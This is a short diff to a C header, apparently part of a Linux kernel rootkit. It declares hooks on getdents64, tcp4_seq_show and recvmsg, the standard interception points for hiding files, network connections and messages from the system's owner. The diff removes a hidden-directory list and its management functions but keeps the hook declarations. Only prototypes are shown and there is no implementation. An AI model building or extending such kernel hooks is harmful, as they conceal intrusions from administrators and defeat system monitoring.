@@ -25,14 +25,6 @@ struct linux_dirent64 {
     char d_name[];
 };
 
-struct hidden_dir_entry {
-    char *dirname;
-    struct list_head list;
-};
-
-extern struct list_head hidden_dirs_list;
-extern spinlock_t hidden_dirs_lock;
-
 extern asmlinkage int (*__orig_getdents64)(const struct pt_regs *regs);
 extern asmlinkage long (*__orig_tcp4_seq_show)(struct seq_file *seq, void *v);
 extern asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs);
@@ -40,10 +32,5 @@ extern asmlinkage long (*__orig_recvmsg)(const struct pt_regs *regs);
 asmlinkage int notrace getdents64_hook(const struct pt_regs *regs);
 asmlinkage long notrace tcp4_seq_show_hook(struct seq_file *seq, void *v);
 asmlinkage long notrace recvmsg_hook(const struct pt_regs *regs);
-
-int is_hidden(const char *name);
-int add_hidden_dir(const char *dirname);
-int remove_hidden_dir(const char *dirname);
-int list_hidden_dirs(char *buf, size_t buf_size);
 
 #endif // HIDE_H
